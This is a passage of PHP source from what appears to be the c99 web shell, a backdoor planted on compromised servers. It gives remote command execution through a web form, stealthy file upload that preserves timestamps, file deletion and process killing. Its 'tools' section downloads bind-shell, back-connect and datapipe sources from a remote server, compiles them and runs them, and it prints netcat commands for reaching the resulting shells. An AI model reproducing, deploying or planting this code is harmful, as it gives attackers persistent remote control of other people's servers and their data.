     if (!$fp) {$uploadmess .= "Error writing to file ".htmlspecialchars($destin)."!&lt;br&gt;";}
     else
     {
      fwrite($fp,$content,strlen($content));
      fclose($fp);
      if ($filestealth) {touch($uploadpath.$destin,$stat[9],$stat[8]);}
     }
    }
   }
  }
 }
 if ($miniform)
 {
  echo "&lt;b&gt;".$uploadmess."&lt;/b&gt;";
  $act = "ls";
 }
 else
 {
  echo "&lt;b&gt;File upload:&lt;/b&gt;&lt;br&gt;&lt;b&gt;".$uploadmess."&lt;/b&gt;&lt;form enctype=\"multipart/form-data\" method=POST&gt;&lt;input type=\"hidden\" name=\"act\" value=\"upload\"&gt;&lt;input type=\"hidden\" name=\"d\" value=\"".urlencode($d)."\"&gt;
Select file on your local computer: &lt;input name=\"uploadfile\" type=\"file\"&gt;&lt;br&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;or&lt;br&gt;
Input URL: &lt;input name=\"uploadurl\" type=\"text\" value=\"".htmlspecialchars($uploadurl)."\" size=\"70\"&gt;&lt;br&gt;&lt;br&gt;
Save this file dir: &lt;input name=\"uploadpath\" size=\"70\" value=\"".$dispd."\"&gt;&lt;br&gt;&lt;br&gt;
File-name (auto-fill): &lt;input name=uploadfilename size=25&gt;&lt;br&gt;&lt;br&gt;
&lt;input type=checkbox name=uploadautoname value=1 id=df4&gt;&nbsp;convert file name to lovercase&lt;br&gt;&lt;br&gt;
&lt;input type=submit name=submit value=\"Upload\"&gt;
&lt;/form&gt;";
 }
}
if ($act == "delete")
{
 $delerr = "";
 foreach ($actbox as $v)
 {
  $result = FALSE;
  $result = fs_rmobj($v);
  if (!$result) {$delerr .= "Can't delete ".htmlspecialchars($v)."&lt;br&gt;";}
 }
 if (!empty($delerr)) {echo "&lt;b&gt;Deleting with errors:&lt;/b&gt;&lt;br&gt;".$delerr;}
 $act = "ls";
}
if (!$usefsbuff)
{
 if (($act == "paste") or ($act == "copy") or ($act == "cut") or ($act == "unselect")) {echo "&lt;center&gt;&lt;b&gt;Sorry, buffer is disabled. For enable, set directive \"\$useFSbuff\" as TRUE.&lt;/center&gt;";}
}
else
{
 if ($act == "copy") {$err = ""; $sess_data["copy"] = array_merge($sess_data["copy"],$actbox); c99_sess_put($sess_data); $act = "ls"; }
 elseif ($act == "cut") {$sess_data["cut"] = array_merge($sess_data["cut"],$actbox); c99_sess_put($sess_data); $act = "ls";}
 elseif ($act == "unselect") {foreach ($sess_data["copy"] as $k=&gt;$v) {if (in_array($v,$actbox)) {unset($sess_data["copy"][$k]);}} foreach ($sess_data["cut"] as $k=&gt;$v) {if (in_array($v,$actbox)) {unset($sess_data["cut"][$k]);}} c99_sess_put($sess_data); $act = "ls";}
 if ($actemptybuff) {$sess_data["copy"] = $sess_data["cut"] = array(); c99_sess_put($sess_data);}
 elseif ($actpastebuff)
 {
  $psterr = "";
  foreach($sess_data["copy"] as $k=&gt;$v)
  {
   $to = $d.basename($v);
   if (!fs_copy_obj($v,$to)) {$psterr .= "Can't copy ".$v." to ".$to."!&lt;br&gt;";}
   if ($copy_unset) {unset($sess_data["copy"][$k]);}
  }
  foreach($sess_data["cut"] as $k=&gt;$v)
  {
   $to = $d.basename($v);
   if (!fs_move_obj($v,$to)) {$psterr .= "Can't move ".$v." to ".$to."!&lt;br&gt;";}
   unset($sess_data["cut"][$k]);
  }
  c99_sess_put($sess_data);
  if (!empty($psterr)) {echo "&lt;b&gt;Pasting with errors:&lt;/b&gt;&lt;br&gt;".$psterr;}
  $act = "ls";
 }
 elseif ($actarcbuff)
 {
  $arcerr = "";
  if (substr($actarcbuff_path,-7,7) == ".tar.gz") {$ext = ".tar.gz";}
  else {$ext = ".tar.gz";}
  if ($ext == ".tar.gz") {$cmdline = "tar cfzv";}
  $cmdline .= " ".$actarcbuff_path;
  $objects = array_merge($sess_data["copy"],$sess_data["cut"]);
  foreach($objects as $v)
  {
   $v = str_replace("\",DIRECTORY_SEPARATOR,$v);
   if (substr($v,0,strlen($d)) == $d) {$v = basename($v);}
   if (is_dir($v))
   {
    if (substr($v,-1) != DIRECTORY_SEPARATOR) {$v .= DIRECTORY_SEPARATOR;}
    $v .= "*";
   }
   $cmdline .= " ".$v;
  }
  $tmp = realpath(".");
  chdir($d);
  $ret = myshellexec($cmdline);
  chdir($tmp);
  if (empty($ret)) {$arcerr .= "Can't call archivator (".htmlspecialchars(str2mini($cmdline,60)).")!&lt;br&gt;";}
  $ret = str_replace("
","
",$ret);
  $ret = explode("
",$ret);
  if ($copy_unset) {foreach($sess_data["copy"] as $k=&gt;$v) {unset($sess_data["copy"][$k]);}}
  foreach($sess_data["cut"] as $k=&gt;$v)
  {
   if (in_array($v,$ret)) {fs_rmobj($v);}
   unset($sess_data["cut"][$k]);
  }
  c99_sess_put($sess_data);
  if (!empty($arcerr)) {echo "&lt;b&gt;Archivation errors:&lt;/b&gt;&lt;br&gt;".$arcerr;}
  $act = "ls";
 }
 elseif ($actpastebuff)
 {
  $psterr = "";
  foreach($sess_data["copy"] as $k=&gt;$v)
  {
   $to = $d.basename($v);
   if (!fs_copy_obj($v,$d)) {$psterr .= "Can't copy ".$v." to ".$to."!&lt;br&gt;";}
   if ($copy_unset) {unset($sess_data["copy"][$k]);}
  }
  foreach($sess_data["cut"] as $k=&gt;$v)
  {
   $to = $d.basename($v);
   if (!fs_move_obj($v,$d)) {$psterr .= "Can't move ".$v." to ".$to."!&lt;br&gt;";}
   unset($sess_data["cut"][$k]);
  }
  c99_sess_put($sess_data);
  if (!empty($psterr)) {echo "&lt;b&gt;Pasting with errors:&lt;/b&gt;&lt;br&gt;".$psterr;}
  $act = "ls";
 }
}
if ($act == "cmd")
{
if (trim($cmd) == "ps -aux") {$act = "processes";}
elseif (trim($cmd) == "tasklist") {$act = "processes";}
else
{
 @chdir($chdir);
 if (!empty($submit))
 {
  echo "&lt;b&gt;Result of execution this command&lt;/b&gt;:&lt;br&gt;";
  $olddir = realpath(".");
  @chdir($d);
  $ret = myshellexec($cmd);
  $ret = convert_cyr_string($ret,"d","w");
  if ($cmd_txt)
  {
   $rows = count(explode("
",$ret))+1;
   if ($rows &lt; 10) {$rows = 10;}
   echo "&lt;br&gt;&lt;textarea cols=\"122\" rows=\"".$rows."\" readonly&gt;".htmlspecialchars($ret)."&lt;/textarea&gt;";
  }
  else {echo $ret."&lt;br&gt;";}
  @chdir($olddir);
 }
 else {echo "&lt;b&gt;Execution command&lt;/b&gt;"; if (empty($cmd_txt)) {$cmd_txt = TRUE;}}
 echo "&lt;form method=POST&gt;&lt;input type=hidden name=act value=cmd&gt;&lt;textarea name=cmd cols=122 rows=10&gt;".htmlspecialchars($cmd)."&lt;/textarea&gt;&lt;input type=hidden name=\"d\" value=\"".$dispd."\"&gt;&lt;br&gt;&lt;br&gt;&lt;input type=submit name=submit value=\"Execute\"&gt;&nbsp;Display in text-area&nbsp;&lt;input type=\"checkbox\" name=\"cmd_txt\" value=\"1\""; if ($cmd_txt) {echo " checked";} echo "&gt;&lt;/form&gt;";
}
}
if ($act == "ls")
{
 if (count($ls_arr) &gt; 0) {$list = $ls_arr;}
 else
 {
  $list = array();
  if ($h = @opendir($d))
  {
   while (($o = readdir($h)) !== FALSE) {$list[] = $d.$o;}
   closedir($h);
  }
  else {}
 }
 if (count($list) == 0) {echo "&lt;center&gt;&lt;b&gt;Can't open folder (".htmlspecialchars($d).")!&lt;/b&gt;&lt;/center&gt;";}
 else
 {
  //Building array
  $objects = array();
  $vd = "f"; //Viewing mode
  if ($vd == "f")
  {
   $objects["head"] = array();
   $objects["folders"] = array();
   $objects["links"] = array();
   $objects["files"] = array();
   foreach ($list as $v)
   {
    $o = basename($v);
    $row = array();
    if ($o == ".") {$row[] = $d.$o; $row[] = "LINK";}
    elseif ($o == "..") {$row[] = $d.$o; $row[] = "LINK";}
    elseif (is_dir($v))
    {
     if (is_link($v)) {$type = "LINK";}
     else {$type = "DIR";}
     $row[] = $v;
     $row[] = $type;
    }
    elseif(is_file($v)) {$row[] = $v; $row[] = filesize($v);}
    $row[] = filemtime($v);
    if (!$win)
    {
     $ow = posix_getpwuid(fileowner($v));
     $gr = posix_getgrgid(filegroup($v));
     $row[] = ($ow["name"]?$ow["name"]:fileowner($v))."/".($gr["name"]?$gr["name"]:filegroup($v));
    }
    $row[] = fileperms($v);
    if (($o == ".") or ($o == "..")) {$objects["head"][] = $row;}
    elseif (is_link($v)) {$objects["links"][] = $row;}
    elseif (is_dir($v)) {$objects["folders"][] = $row;}
    elseif (is_file($v)) {$objects["files"][] = $row;}
    $i++;
   }
   $row = array();
   $row[] = "&lt;b&gt;Name&lt;/b&gt;";
   $row[] = "&lt;b&gt;Size&lt;/b&gt;";
   $row[] = "&lt;b&gt;Modify&lt;/b&gt;";
   if (!$win)
  {$row[] = "&lt;b&gt;Owner/Group&lt;/b&gt;";}
   $row[] = "&lt;b&gt;Perms&lt;/b&gt;";
   $row[] = "&lt;b&gt;Action&lt;/b&gt;";
   $parsesort = parsesort($sort);
   $sort = $parsesort[0].$parsesort[1];
   $k = $parsesort[0];
   if ($parsesort[1] != "a") {$parsesort[1] = "d";}
   $y = "&lt;a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode($d)."';document.todo.sort.value='".$k.($parsesort[1] == "a"?"d":"a").";document.todo.submit();\"&gt;";
   $row[$k] .= $y;
   for($i=0;$i&lt;count($row)-1;$i++)
   {
    if ($i != $k) {$row[$i] = "&lt;a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode($d)."';document.todo.sort.value='".$i.$parsesort[1]."';document.todo.submit();\"&gt;".$row[$i]."&lt;/a&gt;";}
   }
   $v = $parsesort[0];
   usort($objects["folders"], "tabsort");
   usort($objects["links"], "tabsort");
   usort($objects["files"], "tabsort");
   if ($parsesort[1] == "d")
   {
    $objects["folders"] = array_reverse($objects["folders"]);
    $objects["files"] = array_reverse($objects["files"]);
   }
   $objects = array_merge($objects["head"],$objects["folders"],$objects["links"],$objects["files"]);
   $tab = array();
   $tab["cols"] = array($row);
   $tab["head"] = array();
   $tab["folders"] = array();
   $tab["links"] = array();
   $tab["files"] = array();
   $i = 0;
   foreach ($objects as $a)
   {
    $v = $a[0];
    $o = basename($v);
    $dir = dirname($v);
    if ($disp_fullpath) {$disppath = $v;}
    else {$disppath = $o;}
    $disppath = str2mini($disppath,60);
    if (in_array($v,$sess_data["cut"])) {$disppath = "&lt;strike&gt;".$disppath."&lt;/strike&gt;";}
    elseif (in_array($v,$sess_data["copy"])) {$disppath = "&lt;u&gt;".$disppath."&lt;/u&gt;";}
    foreach ($regxp_highlight as $r)
    {
     if (ereg($r[0],$o))
     {
      if ((!is_numeric($r[1])) or ($r[1] &gt; 3)) {$r[1] = 0; ob_clean(); echo "Warning! Configuration error in \$regxp_highlight[".$k."][0] - unknown command."; c99shexit();}
      else
      {
       $r[1] = round($r[1]);
       $isdir = is_dir($v);
       if (($r[1] == 0) or (($r[1] == 1) and !$isdir) or (($r[1] == 2) and !$isdir))
       {
        if (empty($r[2])) {$r[2] = "&lt;b&gt;"; $r[3] = "&lt;/b&gt;";}
        $disppath = $r[2].$disppath.$r[3];
        if ($r[4]) {break;}
       }
      }
     }
    }
    $uo = urlencode($o);
    $ud = urlencode($dir);
    $uv = urlencode($v);
    $row = array();
    if ($o == ".")
    {
     $row[] = "&lt;a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode(realpath($d.$o))."';document.todo.sort.value='".$sort."';document.todo.submit();\"&gt;".$o."&lt;/a&gt;";
     $row[] = "LINK";
    }
    elseif ($o == "..")
    {
     $row[] = "&lt;a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode(realpath($d.$o))."';document.todo.sort.value='".$sort."';document.todo.submit();\"&gt;".$o."&lt;/a&gt;";
     $row[] = "LINK";
    }
    elseif (is_dir($v))
    {
     if (is_link($v))
     {
      $disppath .= " =&gt; ".readlink($v);
      $type = "LINK";
      $row[] =  "&nbsp;&lt;a href=\"#\" onclick=\"document.todo.act.value='ls';document.todo.d.value='".$uv."';document.todo.sort.value='".$sort."';document.todo.submit();\"&gt;[".$disppath."]&lt;/a&gt;";         }
     else
     {
      $type = "DIR";
      $row[] =  "&nbsp;&lt;a href=\"#\" onclick=\"document.todo.act.value='ls';document.todo.d.value='".$uv."';document.todo.sort.value='".$sort."';document.todo.submit();\"&gt;[".$disppath."]&lt;/a&gt;";
     }
     $row[] = $type;
    }
    elseif(is_file($v))
    {
     $ext = explode(".",$o);
     $c = count($ext)-1;
     $ext = $ext[$c];
     $ext = strtolower($ext);
     $row[] =  "&nbsp;&lt;a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.d.value='".$ud."';document.todo.f.value='".$uo."';document.todo.submit();\"&gt;".$disppath."&lt;/a&gt;";
     $row[] = view_size($a[1]);
    }
    $row[] = date("d.m.Y H:i:s",$a[2]);
    if (!$win) {$row[] = $a[3];}
     $row[] =  "&nbsp;&lt;a href=\"#\" onclick=\"document.todo.act.value='chmod';document.todo.d.value='".$ud."';document.todo.f.value='".$uo."';document.todo.submit();\"&gt;&lt;b&gt;".view_perms_color($v)."&lt;/b&gt;&lt;/a&gt;";
    if ($o == ".") {$checkbox = "&lt;input type=\"checkbox\" name=\"actbox[]\" onclick=\"ls_reverse_all();\"&gt;"; $i--;}
    else {$checkbox = "&lt;input type=\"checkbox\" name=\"actbox[]\" id=\"actbox".$i."\" value=\"".htmlspecialchars($v)."\"&gt;";}
    if (is_dir($v)){$row[] = "&lt;a href=\"#\" onclick=\"document.todo.act.value='d';document.todo.d.value='".$uv."';document.todo.submit();\"&gt;I&lt;/a&gt;&nbsp;".$checkbox;}
    else {$row[] = "&lt;a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".$uo."';document.todo.ft.value='info';document.todo.d.value='".$ud."';document.todo.submit();\"&gt;I&lt;/a&gt;&nbsp;&lt;a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".$uo."';document.todo.ft.value='edit';document.todo.d.value='".$ud."';document.todo.submit();\"&gt;E&lt;/a&gt;&nbsp;&lt;a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".$uo."';document.todo.ft.value='download';document.todo.d.value='".$ud."';document.todo.submit();\"&gt;D&lt;/a&gt;&nbsp;".$checkbox;}
    if (($o == ".") or ($o == "..")) {$tab["head"][] = $row;}
    elseif (is_link($v)) {$tab["links"][] = $row;}
    elseif (is_dir($v)) {$tab["folders"][] = $row;}
    elseif (is_file($v)) {$tab["files"][] = $row;}
    $i++;
   }
  }
  //Compiling table
  $table = array_merge($tab["cols"],$tab["head"],$tab["folders"],$tab["links"],$tab["files"]);
  echo "&lt;center&gt;&lt;b&gt;Listing folder (".count($tab["files"])." files and ".(count($tab["folders"])+count($tab["links"]))." folders):&lt;/b&gt;&lt;/center&gt;&lt;br&gt;&lt;TABLE cellSpacing=0 cellPadding=0 width=100% bgColor=#333333 borderColorLight=#433333 border=0&gt;&lt;form method=POST name=\"ls_form\"&gt;&lt;input type=hidden name=act value=".$dspact."&gt;&lt;input type=hidden name=d value=".$d."&gt;";
  foreach($table as $row)
  {
   echo "&lt;tr&gt;
";
   foreach($row as $v) {echo "&lt;td&gt;".$v."&lt;/td&gt;
";}
   echo "&lt;/tr&gt;
";
  }
  echo "&lt;/table&gt;&lt;hr size=\"1\" noshade&gt;&lt;p align=\"right\"&gt;
  &lt;script&gt;
  function ls_setcheckboxall(status)
  {
   var id = 0;
   var num = ".(count($table)-2).";
   while (id &lt;= num)
   {
    document.getElementById('actbox'+id).checked = status;
    id++;
   }
  }
  function ls_reverse_all()
  {
   var id = 0;
   var num = ".(count($table)-2).";
   while (id &lt;= num)
   {
    document.getElementById('actbox'+id).checked = !document.getElementById('actbox'+id).checked;
    id++;
   }
  }
  &lt;/script&gt;
  &lt;input type=\"button\" onclick=\"ls_setcheckboxall(1);\" value=\"Select all\"&gt;&nbsp;&nbsp;&lt;input type=\"button\" onclick=\"ls_setcheckboxall(0);\" value=\"Unselect all\"&gt;&lt;b&gt;";
  if (count(array_merge($sess_data["copy"],$sess_data["cut"])) &gt; 0 and ($usefsbuff))
  {
   echo "&lt;input type=submit name=actarcbuff value=\"Pack buffer to archive\"&gt;&nbsp;&lt;input type=\"text\" name=\"actarcbuff_path\" value=\"archive_".substr(md5(rand(1,1000).rand(1,1000)),0,5).".tar.gz\"&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type=submit name=\"actpastebuff\" value=\"Paste\"&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type=submit name=\"actemptybuff\" value=\"Empty buffer\"&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
  }
  echo "&lt;select name=act&gt;&lt;option value=\"".$act."\"&gt;With selected:&lt;/option&gt;";
  echo "&lt;option value=delete".($dspact == "delete"?" selected":"")."&gt;Delete&lt;/option&gt;";
  echo "&lt;option value=chmod".($dspact == "chmod"?" selected":"")."&gt;Change-mode&lt;/option&gt;";
  if ($usefsbuff)
  {
   echo "&lt;option value=cut".($dspact == "cut"?" selected":"")."&gt;Cut&lt;/option&gt;";
   echo "&lt;option value=copy".($dspact == "copy"?" selected":"")."&gt;Copy&lt;/option&gt;";
   echo "&lt;option value=unselect".($dspact == "unselect"?" selected":"")."&gt;Unselect&lt;/option&gt;";
  }
  echo "&lt;/select&gt;&nbsp;&lt;input type=submit value=\"Confirm\"&gt;&lt;/p&gt;";
  echo "&lt;/form&gt;";
 }
}
if ($act == "tools")
{
 $bndportsrcs = array(
  "c99sh_bindport.pl"=&gt;array("Using PERL","perl %path %port"),
  "c99sh_bindport.c"=&gt;array("Using C","%path %port %pass")
 );
 $bcsrcs = array(
  "c99sh_backconn.pl"=&gt;array("Using PERL","perl %path %host %port"),
  "c99sh_backconn.c"=&gt;array("Using C","%path %host %port")
 );
 $dpsrcs = array(
  "c99sh_datapipe.pl"=&gt;array("Using PERL","perl %path %localport %remotehost %remoteport"),
  "c99sh_datapipe.c"=&gt;array("Using C","%path %localport %remoteport %remotehost")
 );
 if (!is_array($bind)) {$bind = array();}
 if (!is_array($bc)) {$bc = array();}
 if (!is_array($datapipe)) {$datapipe = array();}

 if (!is_numeric($bind["port"])) {$bind["port"] = $bindport_port;}
 if (empty($bind["pass"])) {$bind["pass"] = $bindport_pass;}

 if (empty($bc["host"])) {$bc["host"] = getenv("REMOTE_ADDR");}
 if (!is_numeric($bc["port"])) {$bc["port"] = $bc_port;}

 if (empty($datapipe["remoteaddr"])) {$datapipe["remoteaddr"] = "irc.dalnet.ru:6667";}
 if (!is_numeric($datapipe["localport"])) {$datapipe["localport"] = $datapipe_localport;}
 if (!empty($bindsubmit))
 {
  echo "&lt;b&gt;Result of binding port:&lt;/b&gt;&lt;br&gt;";
  $v = $bndportsrcs[$bind["src"]];
  if (empty($v)) {echo "Unknown file!&lt;br&gt;";}
  elseif (fsockopen(getenv("SERVER_ADDR"),$bind["port"],$errno,$errstr,0.1)) {echo "Port alredy in use, select any other!&lt;br&gt;";}
  else
  {
   $w = explode(".",$bind["src"]);
   $ext = $w[count($w)-1];
   unset($w[count($w)-1]);
   $srcpath = join(".",$w).".".rand(0,999).".".$ext;
   $binpath = $tmpdir.join(".",$w).rand(0,999);
   if ($ext == "pl") {$binpath = $srcpath;}
   @unlink($srcpath);
   $fp = fopen($srcpath,"ab+");
   if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!&lt;br&gt;";}
   elseif (!$data = c99getsource($bind["src"])) {echo "Can't download sources!";}
   else
   {
    fwrite($fp,$data,strlen($data));
    fclose($fp);
    if ($ext == "c") {$retgcc = myshellexec("gcc -o ".$binpath." ".$srcpath);  @unlink($srcpath);}
    $v[1] = str_replace("%path",$binpath,$v[1]);
    $v[1] = str_replace("%port",$bind["port"],$v[1]);
    $v[1] = str_replace("%pass",$bind["pass"],$v[1]);
    $v[1] = str_replace("//","/",$v[1]);
    $retbind = myshellexec($v[1]." &gt; /dev/null &");
    sleep(5);
    $sock = fsockopen("localhost",$bind["port"],$errno,$errstr,5);
    if (!$sock) {echo "I can't connect to localhost:".$bind["port"]."! I think you should configure your firewall.";}
    else {echo "Binding... ok! Connect to &lt;b&gt;".getenv("SERVER_ADDR").":".$bind["port"]."&lt;/b&gt;! You should use NetCat&copy;, run \"&lt;b&gt;nc -v ".getenv("SERVER_ADDR")." ".$bind["port"]."&lt;/b&gt;\"!&lt;center&gt;&lt;a href=\"#\" onclick=\"document.todo.act.value='processes';document.todo.grep.value='".basename($binpath)."';document.todo.submit();\"&gt;&lt;u&gt;View binder's process&lt;/u&gt;&lt;/a&gt;&lt;/center&gt;";}
   }
   echo "&lt;br&gt;";
  }
 }
 if (!empty($bcsubmit))
 {
  echo "&lt;b&gt;Result of back connection:&lt;/b&gt;&lt;br&gt;";
  $v = $bcsrcs[$bc["src"]];
  if (empty($v)) {echo "Unknown file!&lt;br&gt;";}
  else
  {
   $w = explode(".",$bc["src"]);
   $ext = $w[count($w)-1];
   unset($w[count($w)-1]);
   $srcpath = join(".",$w).".".rand(0,999).".".$ext;
   $binpath = $tmpdir.join(".",$w).rand(0,999);
   if ($ext == "pl") {$binpath = $srcpath;}
   @unlink($srcpath);
   $fp = fopen($srcpath,"ab+");
   if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!&lt;br&gt;";}
   elseif (!$data = c99getsource($bc["src"])) {echo "Can't download sources!";}
   else
   {
    fwrite($fp,$data,strlen($data));
    fclose($fp);
    if ($ext == "c") {$retgcc = myshellexec("gcc -o ".$binpath." ".$srcpath); @unlink($srcpath);}
    $v[1] = str_replace("%path",$binpath,$v[1]);
    $v[1] = str_replace("%host",$bc["host"],$v[1]);
    $v[1] = str_replace("%port",$bc["port"],$v[1]);
    $v[1] = str_replace("//","/",$v[1]);
    $retbind = myshellexec($v[1]." &gt; /dev/null &");
    echo "Now script try connect to ".htmlspecialchars($bc["host"]).":".htmlspecialchars($bc["port"])."...&lt;br&gt;";
   }
  }
 }
 if (!empty($dpsubmit))
 {
  echo "&lt;b&gt;Result of datapipe-running:&lt;/b&gt;&lt;br&gt;";
  $v = $dpsrcs[$datapipe["src"]];
  if (empty($v)) {echo "Unknown file!&lt;br&gt;";}
  elseif (fsockopen(getenv("SERVER_ADDR"),$datapipe["port"],$errno,$errstr,0.1)) {echo "Port alredy in use, select any other!&lt;br&gt;";}
  else
  {
   $srcpath = $tmpdir.$datapipe["src"];
   $w = explode(".",$datapipe["src"]);
   $ext = $w[count($w)-1];
   unset($w[count($w)-1]);
   $srcpath = join(".",$w).".".rand(0,999).".".$ext;
   $binpath = $tmpdir.join(".",$w).rand(0,999);
   if ($ext == "pl") {$binpath = $srcpath;}
   @unlink($srcpath);
   $fp = fopen($srcpath,"ab+");
   if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!&lt;br&gt;";}
   elseif (!$data = c99getsource($datapipe["src"])) {echo "Can't download sources!";}
   else
   {
    fwrite($fp,$data,strlen($data));
    fclose($fp);
    if ($ext == "c") {$retgcc = myshellexec("gcc -o ".$binpath." ".$srcpath); @unlink($srcpath);}
    list($datapipe["remotehost"],$datapipe["remoteport"]) = explode(":",$datapipe["remoteaddr"]);
    $v[1] = str_replace("%path",$binpath,$v[1]);
    $v[1] = str_replace("%localport",$datapipe["localport"],$v[1]);
    $v[1] = str_replace("%remotehost",$datapipe["remotehost"],$v[1]);
    $v[1] = str_replace("%remoteport",$datapipe["remoteport"],$v[1]);
    $v[1] = str_replace("//","/",$v[1]);
    $retbind = myshellexec($v[1]." &gt; /dev/null &");
    sleep(5);
    $sock = fsockopen("localhost",$datapipe["port"],$errno,$errstr,5);
    if (!$sock) {echo "I can't connect to localhost:".$datapipe["localport"]."! I think you should configure your firewall.";}
    else {echo "Running datapipe... ok! Connect to &lt;b&gt;".getenv("SERVER_ADDR").":".$datapipe["port"].", and you will connected to ".$datapipe["remoteaddr"]."&lt;/b&gt;! You should use NetCat&copy;, run \"&lt;b&gt;nc -v ".getenv("SERVER_ADDR")." ".$bind["port"]."&lt;/b&gt;\"!&lt;center&gt;&lt;a href=\"#\" onclick=\"document.todo.act.value='processes';document.todo.grep.value='".basename($binpath)."';document.todo.submit();\"&gt;&lt;u&gt;View datapipe process&lt;/u&gt;&lt;/a&gt;&lt;/center&gt;";}
   }
   echo "&lt;br&gt;";
  }
 }
 ?>&lt;b&gt;Binding port:&lt;/b&gt;&lt;br&gt;&lt;form method="POST"&gt;&lt;input type=hidden name=act value=tools&gt;&lt;input type=hidden name=d value="<?php echo $d; ?>"&gt;Port: &lt;input type=text name="bind[port]" value="<?php echo htmlspecialchars($bind["port"]); ?>"&gt;&nbsp;Password: &lt;input type=text name="bind[pass]" value="<?php echo htmlspecialchars($bind["pass"]); ?>"&gt;&nbsp;&lt;select name="bind[src]"&gt;<?php
 foreach($bndportsrcs as $k=&gt;$v) {echo "&lt;option value=\"".$k."\""; if ($k == $bind["src"]) {echo " selected";} echo "&gt;".$v[0]."&lt;/option&gt;";}
 ?>&lt;/select&gt;&nbsp;&lt;input type=submit name=bindsubmit value="Bind"&gt;&lt;/form&gt;
&lt;b&gt;Back connection:&lt;/b&gt;&lt;br&gt;&lt;form method="POST"&gt;&lt;input type=hidden name=act value=tools&gt;&lt;input type=hidden name=d value="<?php echo $d; ?>"&gt;HOST: &lt;input type=text name="bc[host]" value="<?php echo htmlspecialchars($bc["host"]); ?>"&gt;&nbsp;Port: &lt;input type=text name="bc[port]" value="<?php echo htmlspecialchars($bc["port"]); ?>"&gt;&nbsp;&lt;select name="bc[src]"&gt;<?php
foreach($bcsrcs as $k=&gt;$v) {echo "&lt;option value=\"".$k."\""; if ($k == $bc["src"]) {echo " selected";} echo "&gt;".$v[0]."&lt;/option&gt;";}
?>&lt;/select&gt;&nbsp;&lt;input type=submit name=bcsubmit value="Connect"&gt;&lt;/form&gt;
Click "Connect" only after open port for it. You should use NetCat&copy;, run "&lt;b&gt;nc -l -n -v -p <?php echo $bc_port; ?>&lt;/b&gt;"!&lt;br&gt;&lt;br&gt;
&lt;b&gt;Datapipe:&lt;/b&gt;&lt;br&gt;&lt;form method="POST"&gt;&lt;input type=hidden name=act value=tools&gt;&lt;input type=hidden name=d value="<?php echo $d; ?>"&gt;HOST: &lt;input type=text name="datapipe[remoteaddr]" value="<?php echo htmlspecialchars($datapipe["remoteaddr"]); ?>"&gt;&nbsp;Local port: &lt;input type=text name="datapipe[localport]" value="<?php echo htmlspecialchars($datapipe["localport"]); ?>"&gt;&nbsp;&lt;select name="datapipe[src]"&gt;<?php
foreach($dpsrcs as $k=&gt;$v) {echo "&lt;option value=\"".$k."\""; if ($k == $bc["src"]) {echo " selected";} echo "&gt;".$v[0]."&lt;/option&gt;";}
?>&lt;/select&gt;&nbsp;&lt;input type=submit name=dpsubmit value="Run"&gt;&lt;/form&gt;&lt;b&gt;Note:&lt;/b&gt; sources will be downloaded from remote server.<?php
}
if ($act == "processes")
{
 echo "&lt;b&gt;Processes:&lt;/b&gt;&lt;br&gt;";
 if (!$win) {$handler = "ps -aux".($grep?" | grep '".addslashes($grep)."'":"");}
 else {$handler = "tasklist";}
 $ret = myshellexec($handler);
 if (!$ret) {echo "Can't execute \"".$handler."\"!";}
 else
 {
  if (empty($processes_sort)) {$processes_sort = $sort_default;}
  $parsesort = parsesort($processes_sort);
  if (!is_numeric($parsesort[0])) {$parsesort[0] = 0;}
  $k = $parsesort[0];
  if ($parsesort[1] != "a") {$y = "&lt;a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode($d)."';document.todo.processes_sort.value='".$k."a\"';document.todo.submit();\"&gt;!&lt;/a&gt;";}
  else {$y = "&lt;a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode($d)."';document.todo.processes_sort.value='".$k."d\"';document.todo.submit();\"&gt;!&lt;/a&gt;";}
  $ret = htmlspecialchars($ret);
  if (!$win)
  {
   if ($pid)
   {
    if (is_null($sig)) {$sig = 9;}
    echo "Sending signal ".$sig." to #".$pid."... ";
    if (posix_kill($pid,$sig)) {echo "OK.";}
    else {echo "ERROR.";}
   }
   while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}
   $stack = explode("
",$ret);
   $head = explode(" ",$stack[0]);
   unset($stack[0]);
   for($i=0;$i&lt;count($head);$i++)
   {
    if ($i != $k) {$head[$i] = "&lt;a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode($d)."';document.todo.processes_sort.value='".$i.$parsesort[1]."';document.todo.submit();\"&gt;&lt;b&gt;".$head[$i]."&lt;/b&gt;&lt;/a&gt;";}
   }
   $prcs = array();
   foreach ($stack as $line)
   {
    if (!empty($line))
        {
         echo "&lt;tr&gt;";
     $line = explode(" ",$line);
     $line[10] = join(" ",array_slice($line,10));
     $line = array_slice($line,0,11);
     if ($line[0] == get_current_user()) {$line[0] = "&lt;font color=green&gt;".$line[0]."&lt;/font&gt;";}
     $line[] = "&lt;a href=\"#\" onclick=\"document.todo.act.value='processes';document.todo.d.value='".urlencode($d)."';document.todo.pid.value='".$line[1]."';document.todo.sig.value='9';document.todo.submit();\"&gt;&lt;u&gt;KILL&lt;/u&gt;&lt;/a&gt;";
     $prcs[] = $line;
     echo "&lt;/tr&gt;";
    }
   }
  }
  else
  {
   while (ereg("  ",$ret)) {$ret = str_replace("  ","        ",$ret);}
